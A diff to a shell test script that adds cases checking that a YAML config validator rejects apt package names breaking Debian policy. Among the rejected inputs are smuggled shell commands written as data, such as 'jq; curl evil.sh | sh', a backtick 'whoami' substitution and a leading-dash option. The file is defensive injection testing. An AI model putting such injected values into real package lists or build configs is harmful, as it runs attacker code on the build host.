@@ -263,6 +263,44 @@ tcp_egress:
 EOF
 )"
 
+# --- H1: apt package name validation ----------------------------------------
+check "valid apt packages accepted" 0 "" "$(cat <<'EOF'
+runtime: node:24
+apt:
+  - jq
+  - libssl3
+  - python3.11-dev
+EOF
+)"
+
+check "apt name with shell metachar rejected (H1)" 1 "package names must match Debian policy" "$(cat <<'EOF'
+runtime: node:24
+apt:
+  - "jq; curl evil.sh | sh"
+EOF
+)"
+
+check "apt name with leading dash rejected (H1)" 1 "package names must match Debian policy" "$(cat <<'EOF'
+runtime: node:24
+apt:
+  - "-y"
+EOF
+)"
+
+check "apt name with uppercase rejected (H1)" 1 "package names must match Debian policy" "$(cat <<'EOF'
+runtime: node:24
+apt:
+  - "BadPackage"
+EOF
+)"
+
+check "apt name with backtick rejected (H1)" 1 "package names must match Debian policy" "$(cat <<'EOF'
+runtime: node:24
+apt:
+  - "jq`whoami`"
+EOF
+)"
+
 # --- H11: malformed YAML must fail-closed (not silently pass) ----------------
 check "malformed YAML fails-closed (H11)" 1 \
     "yq failed parsing" \
